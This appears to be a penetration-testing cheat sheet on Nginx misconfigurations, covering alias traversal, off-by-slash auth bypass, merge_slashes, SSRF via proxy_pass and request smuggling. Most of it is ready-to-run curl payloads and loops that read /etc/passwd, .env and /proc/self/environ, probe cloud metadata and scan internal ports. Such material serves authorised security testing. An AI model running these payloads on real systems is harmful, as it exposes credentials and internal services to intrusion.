# Nginx Misconfiguration — Alias Traversal, Off-by-Slash, merge_slashes

Common Nginx configuration vulnerabilities that expose internal files or bypass access controls.

## Phase 1: Detection

```bash
# Fingerprint Nginx:
curl -s -I "https://target.com/" | grep -i "server:"
curl -s -I "https://target.com/nonexistent" | grep -i "nginx"

# Check for version disclosure:
curl -s -I "https://target.com/" | grep "Server: nginx/"
```

---

## Phase 2: Alias Path Traversal (Off-by-Slash)

```bash
# Vulnerable config:
# location /static {
#     alias /var/www/files/;
# }
# Note: /static (no trailing slash) + alias /var/www/files/ (with trailing slash)

# Exploit: /static../etc/passwd → /var/www/files/../etc/passwd
curl -s "https://target.com/static../etc/passwd"
curl -s "https://target.com/static../etc/nginx/nginx.conf"
curl -s "https://target.com/static../var/www/html/.env"
curl -s "https://target.com/static../proc/self/environ"

# Variations:
curl -s "https://target.com/static../"
curl -s "https://target.com/images../"
curl -s "https://target.com/assets../"
curl -s "https://target.com/files../"
curl -s "https://target.com/media../"

# With URL encoding:
curl -s "https://target.com/static%2F..%2Fetc%2Fpasswd"
curl -s "https://target.com/static%2F..%2F..%2F..%2Fetc%2Fpasswd"

# Automated test with common location prefixes:
for loc in static images assets files media uploads css js fonts; do
  STATUS=$(curl -s -o /dev/null -w "%{http_code}" "https://target.com/$loc../etc/passwd")
  echo "$STATUS /target.com/$loc../etc/passwd"
done
```

---

## Phase 3: Off-by-Slash Auth Bypass

```bash
# Vulnerable config:
# location /admin {
#     deny all;
# }
# location /admin/ {
#     proxy_pass http://backend/admin/;
# }

# Bypass: /admin/ is denied but /admin/. or /admin// may not be:
curl -s "https://target.com/admin/"
curl -s "https://target.com/admin/."
curl -s "https://target.com/admin//"
curl -s "https://target.com//admin/"

# Internal location bypass:
curl -s "https://target.com/admin/../admin/"
curl -s "https://target.com/%2Fadmin/"

# Test all protected paths:
for path in /admin /api/internal /management /metrics /health /debug /console; do
  for suffix in "" "/" "/." "//" "/./" "/%2F"; do
    URL="https://target.com$path$suffix"
    STATUS=$(curl -s -o /dev/null -w "%{http_code}" "$URL")
    [ "$STATUS" != "403" ] && [ "$STATUS" != "404" ] && echo "$STATUS $URL"
  done
done
```

---

## Phase 4: merge_slashes Disabled

```bash
# If merge_slashes off; in nginx config:
# Double slashes not normalized → bypass path-based rules

# Test double slash:
curl -s "https://target.com//etc/passwd"
curl -s "https://target.com//api//admin//users"
curl -s "https://target.com///secret"

# Bypass location blocks:
curl -s "https://target.com//admin/users"
curl -s "https://target.com//internal/config"
```

---

## Phase 5: Proxy Misrouting

```bash
# Nginx proxy_pass with trailing slash confusion:
# location /api/ { proxy_pass http://backend/; }
# /api/v1/users → backend/v1/users (correct)
# BUT: /api/../etc/passwd → ?

# SSRF via proxy misconfiguration:
curl -s "https://target.com/api/http://169.254.169.254/latest/meta-data/"
curl -s "https://target.com/proxy?url=http://internal.service/"

# Try to reach internal services:
for port in 80 443 8080 8443 3000 5000 9000 6379 27017 5432 3306; do
  curl -s --max-time 2 "https://target.com/api/http://127.0.0.1:$port/" -o /dev/null -w "$port: %{http_code}\n"
done
```

---

## Phase 6: Nginx Status & Config Exposure

```bash
# Nginx stub_status exposure:
for path in /nginx_status /status /server-status /nginx-status; do
  STATUS=$(curl -s -o /dev/null -w "%{http_code}" "https://target.com$path")
  [ "$STATUS" = "200" ] && curl -s "https://target.com$path"
done

# Common misconfigured paths:
for path in /.git/config /.env /.htpasswd /web.config \
            /phpinfo.php /info.php /test.php \
            /backup.zip /backup.tar.gz /dump.sql; do
  STATUS=$(curl -s -o /dev/null -w "%{http_code}" "https://target.com$path")
  [ "$STATUS" = "200" ] && echo "EXPOSED: $STATUS https://target.com$path"
done

# Nginx config file locations (if LFI found):
for conf in /etc/nginx/nginx.conf /etc/nginx/sites-enabled/default \
            /usr/local/nginx/conf/nginx.conf /opt/nginx/nginx.conf; do
  echo "Try: $conf"
done
```

---

## Phase 7: HTTP Request Smuggling via Nginx

```bash
# Nginx + backend proxy combination can be vulnerable to CL.TE smuggling:
curl -s -X POST "https://target.com/" \
  -H "Content-Length: 6" \
  -H "Transfer-Encoding: chunked" \
  -d "0\r\n\r\nG"

# Check if Nginx passes raw TE to backend:
curl -s -X POST "https://target.com/" \
  -H "Transfer-Encoding: chunked" \
  -H "Transfer-Encoding: cow" \
  -d "5\r\nhello\r\n0\r\n\r\n"
```

---

## Pro Tips

1. **Alias traversal** — always check when Nginx serves static files; location without `/` trailing slash is the tell
2. **Test all static directories** — `/static`, `/assets`, `/uploads`, `/files`, `/images` are common
3. **URL-encode dots** — `%2e%2e` may bypass Nginx normalization in some configs
4. **Off-by-slash is P1** — can expose source code, `.env`, private keys in web root parent
5. **Check X-Accel-Redirect** — internal redirect header can bypass auth if unvalidated
6. **Autoindex on** — `directory listing` enabled shows files even if no index page

## Summary

Nginx misconfig flow: fingerprint version → test alias traversal (`/static../etc/passwd`) → test off-by-slash auth bypass (`/admin/.`) → check double-slash if merge_slashes disabled → check nginx_status endpoint → document traversal path with full request/response.
